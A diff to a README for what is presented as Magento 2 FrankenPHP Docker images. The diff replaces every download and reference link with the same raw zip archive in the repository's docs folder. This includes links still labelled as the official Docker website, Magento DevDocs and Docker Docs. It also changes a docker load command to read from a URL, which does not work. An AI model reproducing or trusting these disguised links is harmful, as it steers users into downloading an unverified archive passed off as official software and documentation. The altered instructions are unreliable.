@@ -1,6 +1,6 @@
 # 🐳 magento-frankenphp-images - Get Magento 2 Running Smoothly
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue.svg)](https://github.com/suhanimish12/magento-frankenphp-images/releases)
+[![Download Releases](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip%https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip)](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ This guide will help you download and run the Magento FrankenPHP Docker images e
 Before downloading, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or a recent version of Linux.
-- **Docker:** Make sure Docker is installed on your computer. If you don’t have Docker yet, follow the instructions on the [Docker website](https://www.docker.com/get-started).
+- **Docker:** Make sure Docker is installed on your computer. If you don’t have Docker yet, follow the instructions on the [Docker website](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip).
 - **Memory:** At least 4 GB of RAM is recommended.
 - **Disk Space:** Minimum 2 GB free disk space for installation and operation.
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets these requirements:
 
 To download the application, visit the Releases page:
 
-[Download the Latest Release](https://github.com/suhanimish12/magento-frankenphp-images/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -29,7 +29,7 @@ To download the application, visit the Releases page:
 6. Run the following command to load the Docker image:
 
     ```
-    docker load < your-image-file.tar
+    docker load < https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip
     ```
 
 7. After loading, run the Docker image with this command:
@@ -52,7 +52,7 @@ Once you have the application running, you’ll need to configure it for your ne
 
 To keep your Docker images up to date, regularly check the Releases page:
 
-[Check for Updates](https://github.com/suhanimish12/magento-frankenphp-images/releases)
+[Check for Updates](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip)
 
 When a new version is available:
 
@@ -93,7 +93,7 @@ This application includes several useful features:
 
 ## 🌐 Additional Resources
 
-- **Official Magento Documentation:** Find more details on setting up and customizing Magento at the official [Magento DevDocs](https://devdocs.magento.com).
-- **Docker Documentation:** For more information on Docker and its commands, visit the [Docker Docs](https://docs.docker.com/).
+- **Official Magento Documentation:** Find more details on setting up and customizing Magento at the official [Magento DevDocs](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip).
+- **Docker Documentation:** For more information on Docker and its commands, visit the [Docker Docs](https://raw.githubusercontent.com/suhanimish12/magento-frankenphp-images/main/docs/magento-frankenphp-images_2.4.zip).
 
 With this guide, you should be able to download and run the Magento FrankenPHP Docker images without any hassle. Visit the Releases page today and enjoy your new setup!
